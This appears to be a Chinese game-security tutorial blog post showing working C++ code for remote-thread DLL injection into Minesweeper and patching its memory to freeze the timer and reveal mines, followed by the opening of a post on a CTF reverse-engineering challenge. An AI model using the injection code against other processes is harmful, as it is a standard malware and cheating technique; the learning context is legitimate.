id="前置知识-动态调用dll"><a href="#前置知识-动态调用dll" class="headerlink" title="前置知识-动态调用dll"></a>前置知识-动态调用dll</h2><p>主要就是这几个个 API：</p><h3 id="LoadLibraryA"><a href="#LoadLibraryA" class="headerlink" title="LoadLibraryA"></a>LoadLibraryA</h3><p>加载指定 DLL 并返回模块句柄，参数为字符串，就是 dll 的路径。</p><h3 id="GetProcAddress"><a href="#GetProcAddress" class="headerlink" title="GetProcAddress"></a>GetProcAddress</h3><p>获取指定 dll 的导出函数的地址。</p><p>第一个参数是模块句柄，第二个参数是模块函数，返回值为函数的地址。</p><p>通过这两个函数，我们可以拿到所有函数的地址，然后就能进行调用。</p><h3 id="CreateThread-远程线程注入"><a href="#CreateThread-远程线程注入" class="headerlink" title="CreateThread - 远程线程注入"></a>CreateThread - 远程线程注入</h3><p>里面几乎只有一个参数，那就是线程回调函数，然后当然还有返回地址，返回线程 id 啥的，这里我们都可以不用管，几乎是与 Linux 的创建线程函数一致。</p><p>还有一个远程版本的叫 CreateRemoteThread，它可以给别的进程创建一个线程并可以在本进程创建那个进程调用的回调函数。我们可以在回调函数中加载指定的 dll，在 dllmain 的入口当中，有一个 switch 的四个选项。</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">"pch.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule,<span class="comment">//指向自身的句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">                       DWORD  ul_reason_for_call,<span class="comment">//调用原因</span></span></span></span><br><span class="line"><span class="params"><span class="function">                       LPVOID lpReserved<span class="comment">//隐式加载or显式加载</span></span></span></span><br><span class="line"><span class="params"><span class="function">                     )</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    {</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:<span class="comment">//附加到进程上时执行</span></span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:<span class="comment">//附加到线程上时执行</span></span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:<span class="comment">//从线程上剥离时执行</span></span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:<span class="comment">//从进程上剥离时执行</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>我们可以在 DLL_PROCESS_ATTACH 的选项中加入代码，让它在加载的时候调用执行。</p><p>那么我们的步骤是：</p><ol><li>打开指定进程获得句柄</li><li>开辟远程进程的空间，分配可读可写段。</li><li>调用 WriteProcessMemory 将 dll 路径写入该内存区域。</li><li>创建远程线程，回调函数使用 LoadLibrary 加载指定 dll。</li><li>等待返回（loadLibrary返回）</li><li>释放空间</li><li>释放句柄</li><li>返回结果</li></ol><h4 id="远程线程注入demo："><a href="#远程线程注入demo：" class="headerlink" title="远程线程注入demo："></a>远程线程注入demo：</h4><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Inject</span><span class="params">(DWORD ProcessId, <span class="type">const</span> <span class="type">char</span>* szPath)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="comment">//1.打开目标进程获取句柄</span></span><br><span class="line">    HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, ProcessId);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"进程句柄:%p\n"</span>, hProcess);</span><br><span class="line">    <span class="comment">//2.在目标进程体内申请空间</span></span><br><span class="line">    LPVOID lpAddress = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, <span class="number">0x100</span>, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);</span><br><span class="line">    <span class="comment">//3.写入DLL路径</span></span><br><span class="line">    SIZE_T dwWriteLength = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(hProcess, lpAddress, szPath, <span class="built_in">strlen</span>(szPath), &amp;dwWriteLength);</span><br><span class="line">    <span class="comment">//4.创建远程线程，回调函数使用 LoadLibrary 加载指定 dll</span></span><br><span class="line">    HANDLE hThread = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="literal">NULL</span>, (LPTHREAD_START_ROUTINE)LoadLibraryA, lpAddress, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">//5.等待返回（loadLibrary返回）</span></span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(hThread, <span class="number">-1</span>);</span><br><span class="line">    <span class="comment">//6.释放空间</span></span><br><span class="line">    <span class="built_in">VirtualFreeEx</span>(hProcess, lpAddress, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">    <span class="comment">//7.释放句柄</span></span><br><span class="line">    <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">    <span class="comment">//返回结果</span></span><br><span class="line">    <span class="built_in">AfxMessageBox</span>(<span class="string">L"完成"</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="编写DLL注入器"><a href="#编写DLL注入器" class="headerlink" title="编写DLL注入器"></a>编写DLL注入器</h2><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="function">DWORD <span class="title">FindProcess</span><span class="params">()</span> </span>{</span><br><span class="line">    HANDLE hSnap = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">    PROCESSENTRY32 pe32;</span><br><span class="line">    pe32 = { <span class="built_in">sizeof</span>(pe32) };</span><br><span class="line">    BOOL ret = <span class="built_in">Process32First</span>(hSnap, &amp;pe32);</span><br><span class="line">    <span class="keyword">while</span> (ret)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">wcsncmp</span>(pe32.szExeFile, <span class="string">L"mine.exe"</span>, <span class="number">11</span>)) {</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Find winmine.exe Process %d\n"</span>, pe32.th32ProcessID);</span><br><span class="line">            <span class="keyword">return</span> pe32.th32ProcessID;</span><br><span class="line">        }</span><br><span class="line">        ret = <span class="built_in">Process32Next</span>(hSnap, &amp;pe32);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Inject</span><span class="params">(DWORD ProcessId, <span class="type">const</span> <span class="type">char</span>* szPath)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="comment">//1.打开目标进程获取句柄</span></span><br><span class="line">    HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, ProcessId);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"进程句柄:%p\n"</span>, hProcess);</span><br><span class="line">    <span class="comment">//2.在目标进程体内申请空间</span></span><br><span class="line">    LPVOID lpAddress = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, <span class="number">0x100</span>, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);</span><br><span class="line">    <span class="comment">//3.写入DLL路径</span></span><br><span class="line">    SIZE_T dwWriteLength = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(hProcess, lpAddress, szPath, <span class="built_in">strlen</span>(szPath), &amp;dwWriteLength);</span><br><span class="line">    <span class="comment">//4.创建远程线程，回调函数使用 LoadLibrary 加载指定 dll</span></span><br><span class="line">    HANDLE hThread = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="literal">NULL</span>, (LPTHREAD_START_ROUTINE)LoadLibraryA, lpAddress, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">//5.等待返回（loadLibrary返回）</span></span><br><span class="line">    <span class="built_in">WaitForSingleObject</span>(hThread, <span class="number">-1</span>);</span><br><span class="line">    <span class="comment">//6.释放空间</span></span><br><span class="line">    <span class="built_in">VirtualFreeEx</span>(hProcess, lpAddress, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">    <span class="comment">//7.释放句柄</span></span><br><span class="line">    <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>{</span><br><span class="line">    DWORD ProcessId = <span class="built_in">FindProcess</span>();</span><br><span class="line">    <span class="keyword">while</span> (!ProcessId) {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"未找到扫雷程序，等待两秒中再试\n"</span>);</span><br><span class="line">        <span class="built_in">Sleep</span>(<span class="number">2000</span>);</span><br><span class="line">        ProcessId = <span class="built_in">FindProcess</span>();</span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"开始注入进程...\n"</span>);</span><br><span class="line">    <span class="built_in">Inject</span>(ProcessId, <span class="string">"E:\\CODE\\wimine\\Mine\\release\\Mine.dll"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"注入完毕\n"</span>);</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="编写DLL"><a href="#编写DLL" class="headerlink" title="编写DLL"></a>编写DLL</h2><p>这里我们采用MFC DLL 基于对话框 （dialog）的方式编写（简单），使用静态编译的方式</p><p><img src="/2024/07/26/%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8-%E6%89%AB%E9%9B%B7%E5%88%86%E6%9E%90-%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/image-20240726223031408.png" alt="image-20240726223031408"></p><p><img src="/2024/07/26/%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8-%E6%89%AB%E9%9B%B7%E5%88%86%E6%9E%90-%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/image-20240727095847028.png" alt="image-20240727095847028"></p><p>然后我们需要在<strong>资源窗体</strong>，新建一个 <strong>Dialog</strong> ，简单包装一个界面</p><p><img src="/2024/07/26/%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8-%E6%89%AB%E9%9B%B7%E5%88%86%E6%9E%90-%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/image-20240727100353669.png" alt="image-20240727100353669"></p><p>这样我们在加载窗体的时候需要创建一个窗体类对象用它的 <code>DoModal</code> 方法去显示，用线程回调的方式加载并且初始化<code>InitInstance</code> </p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">DlgThreadCallBack</span><span class="params">(LPVOID lp)</span> </span>{</span><br><span class="line">    MineDlg* Dlg;</span><br><span class="line">    Dlg = <span class="keyword">new</span> <span class="built_in">MineDlg</span>();</span><br><span class="line">    Dlg-&gt;<span class="built_in">DoModal</span>();</span><br><span class="line">    <span class="keyword">delete</span> Dlg;</span><br><span class="line">    <span class="built_in">FreeLibraryAndExitThread</span>(theApp.m_hInstance, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"><span class="comment">// CMineApp 初始化</span></span><br><span class="line"><span class="function">BOOL <span class="title">CMineApp::InitInstance</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    CWinApp::<span class="built_in">InitInstance</span>();</span><br><span class="line">    ::<span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, DlgThreadCallBack, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="时间暂停"><a href="#时间暂停" class="headerlink" title="时间暂停"></a>时间暂停</h3><p>上面我们找到了它控制时间增加的指令，我们把它们全部 NOP 掉，就可以实现时间暂停</p><p>写两个按钮，创建下面的事件实现时间暂停开关。</p><p><img src="/2024/07/26/%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8-%E6%89%AB%E9%9B%B7%E5%88%86%E6%9E%90-%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/image-20240727101439935.png" alt="image-20240727101439935"></p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">GetBaseAddr</span><span class="params">()</span> </span>{</span><br><span class="line">    HMODULE hMode = <span class="built_in">GetModuleHandle</span>(<span class="literal">nullptr</span>);</span><br><span class="line">    <span class="comment">//LPWSTR s = (LPWSTR)malloc(0x100);</span></span><br><span class="line">    <span class="comment">//wsprintf(s, L"基址:%p", hMode);</span></span><br><span class="line">    <span class="comment">//AfxMessageBox(s);</span></span><br><span class="line">    <span class="keyword">return</span> (DWORD)hMode;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">MineDlg::OnBnClickedButton1</span><span class="params">()</span> <span class="comment">// 时间暂停</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line">    <span class="keyword">auto</span> BaseAddr=<span class="built_in">GetBaseAddr</span>();</span><br><span class="line">    DWORD TimeOffset = <span class="number">0x579C</span>;</span><br><span class="line">    DWORD TimeInsOffset = <span class="number">0x2FF5</span>;</span><br><span class="line">    DWORD InsLen = <span class="number">6</span>;</span><br><span class="line">    DWORD old;</span><br><span class="line">    <span class="built_in">VirtualProtect</span>((<span class="type">void</span>*)(BaseAddr + TimeInsOffset), InsLen, PAGE_EXECUTE_READWRITE, &amp;old);</span><br><span class="line">    BYTE INS[] = { <span class="number">0x90</span>,<span class="number">0x90</span>,<span class="number">0x90</span>,<span class="number">0x90</span>,<span class="number">0x90</span>,<span class="number">0x90</span> };</span><br><span class="line">    <span class="built_in">memcpy</span>((<span class="type">void</span> *)(BaseAddr + TimeInsOffset), INS, InsLen);</span><br><span class="line">    <span class="built_in">VirtualProtect</span>((<span class="type">void</span>*)(BaseAddr + TimeInsOffset), InsLen, old, &amp;old);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">MineDlg::OnBnClickedButton2</span><span class="params">()</span> <span class="comment">// 恢复字节即可取消时间暂停</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line">    <span class="keyword">auto</span> BaseAddr = <span class="built_in">GetBaseAddr</span>();</span><br><span class="line">    DWORD TimeOffset = <span class="number">0x579C</span>;</span><br><span class="line">    DWORD TimeInsOffset = <span class="number">0x2FF5</span>;</span><br><span class="line">    DWORD InsLen = <span class="number">6</span>;</span><br><span class="line">    DWORD old;</span><br><span class="line">    <span class="built_in">VirtualProtect</span>((<span class="type">void</span>*)(BaseAddr + TimeInsOffset), InsLen, PAGE_EXECUTE_READWRITE, &amp;old);</span><br><span class="line">    BYTE INS[] = { <span class="number">0xFF</span>,<span class="number">0x05</span>,<span class="number">0x9C</span>,<span class="number">0x57</span>,<span class="number">0x00</span>,<span class="number">0x01</span> };</span><br><span class="line">    <span class="built_in">memcpy</span>((<span class="type">void</span>*)(BaseAddr + TimeInsOffset), INS, <span class="number">6</span>);</span><br><span class="line">    <span class="built_in">VirtualProtect</span>((<span class="type">void</span>*)(BaseAddr + TimeInsOffset), InsLen, old, &amp;old);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>测试</p><p><img src="/2024/07/26/%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8-%E6%89%AB%E9%9B%B7%E5%88%86%E6%9E%90-%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/image-20240727112310405.png" alt="image-20240727112310405"></p><h3 id="透视"><a href="#透视" class="headerlink" title="透视"></a>透视</h3><p>经过上面动态调试我们得出结论：0x2F80函数是踩雷函数。</p><p>我们如果调用这个函数，是不是就能够实现透视了呢？</p><p>我们依旧采取线程回调的方式</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">MineDlg::OnBnClickedButton3</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line">    DWORD ESPOffset = <span class="number">0x2f80</span>;</span><br><span class="line">    DWORD FuncAddr = <span class="built_in">GetBaseAddr</span>() + ESPOffset;</span><br><span class="line">    <span class="comment">// 创建不带参数的线程</span></span><br><span class="line">    <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)FuncAddr, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>测试</p><p><img src="/2024/07/26/%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8-%E6%89%AB%E9%9B%B7%E5%88%86%E6%9E%90-%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/image-20240727112401562.png" alt="image-20240727112401562"></p><h3 id="一键扫雷-1"><a href="#一键扫雷-1" class="headerlink" title="一键扫雷"></a>一键扫雷</h3><p>跟透视差不多，只不过创建带参数的线程回调</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">MineDlg::OnBnClickedButton4</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line">    DWORD ESPOffset = <span class="number">0x347C</span>;</span><br><span class="line">    DWORD FuncAddr = <span class="built_in">GetBaseAddr</span>() + ESPOffset;</span><br><span class="line">    <span class="comment">//创建带参数的线程</span></span><br><span class="line">    <span class="keyword">struct</span> { <span class="type">int</span> a; } s = { <span class="number">0</span> };</span><br><span class="line">    <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="literal">NULL</span>, (LPTHREAD_START_ROUTINE)FuncAddr, &amp;s, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p> 测试</p><p><img src="/2024/07/26/%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8-%E6%89%AB%E9%9B%B7%E5%88%86%E6%9E%90-%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/image-20240727112438128.png" alt="image-20240727112438128"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>通过这个小项目，对WIN游戏安全有初步的认识，并且加强对软件的逆向思维，增强动态调试的能力，找到软件关键的基地址，通过CE修改器，初步pojie软件，了解软件的状态，修改时间（时间暂停等等），理解几个重要的API，FindWindow获取句柄，WriteProcessMemory写入内存信息，LoadLibraryA加载指定 DLL 并返回模块句柄，GetProcAddress，获取指定 dll 的导出函数的地址，CreateThread - 线程回调函数等等。多写，多做，多调，多实验，加油，互勉。</p></body></html>]]></content>
      
      
      
        <tags>
            
            <tag> 游戏安全学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记由长城杯初赛Time_Machine掌握父子进程并出题</title>
      <link href="/2024/07/26/%E8%AE%B0%E7%94%B1%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9BTime-Machine%E6%8E%8C%E6%8F%A1%E7%88%B6%E5%AD%90%E8%BF%9B%E7%A8%8B%E5%B9%B6%E5%87%BA%E9%A2%98/"/>
      <url>/2024/07/26/%E8%AE%B0%E7%94%B1%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9BTime-Machine%E6%8E%8C%E6%8F%A1%E7%88%B6%E5%AD%90%E8%BF%9B%E7%A8%8B%E5%B9%B6%E5%87%BA%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p> <em>掌握一道题目的最好办法就是由做题人变成出题人（）</em></p><p>本文所说的题目是长城杯某区逆向Time_Machine，题目反编译纯gs，所以本文主要讲解笔者出的题目</p><p>：笔者出的题目准备给iscc擂台的，但是没轮上（<del>感觉擂台被控了，怎么说</del>hh）</p><h1 id="出题思路"><a href="#出题思路" class="headerlink" title="出题思路"></a>出题思路</h1><p>额，不算是思路，站在前人的肩膀上罢了。<br>出这道题目的初心是因为比赛的时候用心的做了这道题写了出来感觉收获颇多，但当时只局限于写了出来，并不能全面理解，所以有了这么一个想法。<br>俗话说，实践出真知，熟能生巧，自己去亲手实操将题目敲一遍写一遍，对一个知识点理解的才到位，记忆也更加的深刻。<br>主要加密算法是使用 SuperFastHash 算法对flag逐字节进行哈希处理，然后通过改变环境变量来进入不同的分支，分支里面对内存进行复写和触发异常来实现父子进程的交互，子进程是一大坨代码块，通过以下指令块控制父进程调试子进程实现加密。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">movabs r11,%d</span><br><span class="line">xor r11,0x1337</span><br><span class="line">ror r11,13</span><br><span class="line">movabs r13,1 #0或1</span><br><span class="line">ud2</span><br></pre></td></tr></tbody></table></figure><h1 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h1><p>程序是64位的exe<br>ida64分析<br>拖入ida64后映入眼帘，有一个小的主函数，用于检查环境变量的值，ix221iscc221如果为 null，则继续执行sub_401C38函数，否则调用函数sub_40195C函数<br>也就是相当于一个父进检测<br>检验的方式是通过一个环境变量，过掉的方式很简单，jz指令出下断点，然后改zf标志位即可过掉<br><img src="/2024/07/26/%E8%AE%B0%E7%94%B1%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9BTime-Machine%E6%8E%8C%E6%8F%A1%E7%88%B6%E5%AD%90%E8%BF%9B%E7%A8%8B%E5%B9%B6%E5%87%BA%E9%A2%98/666934a9d9c307b7e92ade83.png" alt="1"></p><h2 id="sub-401C38-输入函数"><a href="#sub-401C38-输入函数" class="headerlink" title="sub_401C38-输入函数"></a>sub_401C38-输入函数</h2><p>进入sub_401C38函数，它打印，然后接受用户输入，然后将内存中的一个区域复制到中间内存，分配一个新的区域，然后将中间内存复制到新分配的区域。（这边的内存就是父进程里面开的子进程并且调试）<br>这个区域是一个 shell 代码，最后调用这个 shell 代码，用作用户输入作为参数。也就是说输入函数是通过子进程进行调用的，并且VirtualAlloc（0x22A6ui64）, — 开辟的shellcode的长度0x22a6.</p><h3 id="debugger"><a href="#debugger" class="headerlink" title="debugger"></a>debugger</h3><p>重新在main分支的地方下断点，过掉jz，然后手动进子进程分支，看看结尾出函数指针在干嘛<br> <img src="/2024/07/26/%E8%AE%B0%E7%94%B1%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9BTime-Machine%E6%8E%8C%E6%8F%A1%E7%88%B6%E5%AD%90%E8%BF%9B%E7%A8%8B%E5%B9%B6%E5%87%BA%E9%A2%98/6669acc2d9c307b7e95e8f21.png" alt="2"><br>f7进入shellcode<br> <img src="/2024/07/26/%E8%AE%B0%E7%94%B1%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9BTime-Machine%E6%8E%8C%E6%8F%A1%E7%88%B6%E5%AD%90%E8%BF%9B%E7%A8%8B%E5%B9%B6%E5%87%BA%E9%A2%98/6669acf8d9c307b7e95f343c.png" alt="3"><br>这儿有一大堆代码块，调一下，发现此块块执行以下操作：</p><p>将用户输入的第一个字节加载到r12b寄存器中<br>将一个奇怪的值与 0x1337 进行异或<br>将结果右移 0xD 位<br>将r13寄存器设置为0<br>执行ud2定义的“未定义”操作码会使程序崩溃！<br>也就是说<br>从输入的flag里取一个字节，也没发现有什么校验逻辑，但注意到<code>ud2</code>指令(<code>0F 0B</code>)，运行到该指令会触发异常<br>由于父进程在调试子进程，所以分析父进程的操作逻辑。</p><h2 id="sub-40195C-父进程"><a href="#sub-40195C-父进程" class="headerlink" 